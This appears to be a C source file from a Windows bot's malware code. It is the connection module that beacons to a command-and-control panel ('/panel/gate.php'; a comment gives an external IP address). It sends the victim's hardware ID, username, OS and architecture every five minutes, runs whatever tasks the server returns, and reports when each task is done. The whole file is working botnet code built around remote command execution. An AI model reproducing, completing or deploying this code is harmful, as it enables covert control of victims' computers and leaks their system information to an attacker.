#include "connection.h"

#include <Wininet.h>

#include "..\common\string.h"
#include "..\common\mem.h"
#include "..\common\utils.h"

#include "os_info.h"
#include "tasks.h"

HANDLE hConnectionThread;

//http://185.38.251.226:8080/panel/gate.php

#ifndef DEBUG
#define REMOTE_HOST "127.0.0.1"
#define REMOTE_PAGE "/panel/gate.php"
#else
#define REMOTE_HOST "127.0.0.1"
#define REMOTE_PAGE "/panel/gate.php"
#endif

extern bot_t bot;

BOOL SendPOST(const LPSTR pszHost, const LPSTR pszPage, const LPSTR pszData, LPSTR* ppszResponse)
{
	HINTERNET hSession, hConnect, hRequest;
	BOOL bSuccess = FALSE;
	char szBuffer[3072];
	DWORD dwDataRead, dwCurrentLength;

	static LPSTR accept[2] = { "*/*", NULL };
	static TCHAR pszHeaders[] =
		("Content-Type: application/x-www-form-urlencoded");

	hRequest = 0;
	hConnect = 0;
	hSession = 0;

	dwCurrentLength = 0;

	do 
	{
		if ((hSession = CWA(InternetOpenW)(L"VultureHttp", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0)) == NULL)
			break;

		if ((hConnect = CWA(InternetConnectA)(hSession, pszHost, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1)) == NULL)
			break;

		if ((hRequest = CWA(HttpOpenRequestA)(hConnect, "POST", pszPage, NULL, NULL, accept, 0, 1)) == NULL)
			break;

		if ((bSuccess = CWA(HttpSendRequestA)(hRequest, pszHeaders, StrLengthA(pszHeaders), pszData, StrLengthA(pszData))) == TRUE)
		{
			memzero(&szBuffer, sizeof(szBuffer));

			while (bot.api.pInternetReadFile(hRequest, szBuffer, 3071, &dwDataRead) && dwDataRead != 0)
			{
				/*if ((*ppszResponse = memalloc(dwDataRead)) != NULL)
				{
					memcopy(*ppszResponse, &szBuffer, dwDataRead);
				}*/

				if(memreallocEx(&(*ppszResponse), dwCurrentLength + dwDataRead + 1))
				{
					memcopy((*ppszResponse) + dwCurrentLength, &szBuffer, dwDataRead);
				}

				memzero(&szBuffer, sizeof(szBuffer));
			}
		}
	} 
	while (FALSE);

	if (hRequest != 0) 
		CWA(InternetCloseHandle)(hRequest);

	if (hConnect != 0)
		CWA(InternetCloseHandle)(hConnect);

	if (hSession != 0)
		CWA(InternetCloseHandle)(hSession);

	return bSuccess;
}

BOOL WINAPI SendTaskSuccess(int iTaskID)
{
	LPSTR pszResponse = NULL;
	BOOL bSuccess = FALSE;
	pc_info_t pc_info = GetPCInfo();
	
	char szBuffer[256];
	memzero(&szBuffer, sizeof(szBuffer));
	bot.api.pwsprintfA(szBuffer, "hwid=%x&taskid=%d&", pc_info.dwSerialNumber, iTaskID);

	bSuccess = SendPOST(REMOTE_HOST, REMOTE_PAGE, szBuffer, &pszResponse);

	if (pszResponse != NULL)
		memfree(pszResponse);

	return bSuccess;
}

BOOL SendReport(int iReportType, const LPSTR pszHost, const LPSTR pszBuffer)
{
	LPSTR pszResponse = NULL;
	BOOL bSuccess = FALSE;
	pc_info_t pc_info = GetPCInfo();
	
	return FALSE;
}

DWORD WINAPI Connection_Thread(LPVOID lpArguments)
{
	LPSTR pszResponse;
	char szBuffer[256];
	pc_info_t pc_info;

	bot = *(bot_t*)lpArguments;

	pszResponse = NULL;
	pc_info = GetPCInfo();

	while (TRUE)
	{
		memzero(&szBuffer, sizeof(szBuffer));
		bot.api.pwsprintfA(szBuffer, "hwid=%x&username=%s&os=%d&arch=%d&", pc_info.dwSerialNumber, pc_info.pszUsername, pc_info.iOS, pc_info.Is64Bit);

		if (SendPOST(REMOTE_HOST, REMOTE_PAGE, szBuffer, &pszResponse))
		{
			if (pszResponse != NULL)
			{
				ExecuteTask(pszResponse);
			}
		}

		if (pszResponse != NULL)
		{
			memfree(pszResponse);
			pszResponse = NULL;
		}

		Utils_Sleep(5 * 60000);
	}

	return 0;
}

BOOL StartConnectionThread(void)
{
	if ((hConnectionThread = bot.api.pCreateThread(0, 0, (LPTHREAD_START_ROUTINE)Connection_Thread, &bot, 0, 0)) != 0)
		return TRUE;
	return FALSE;
}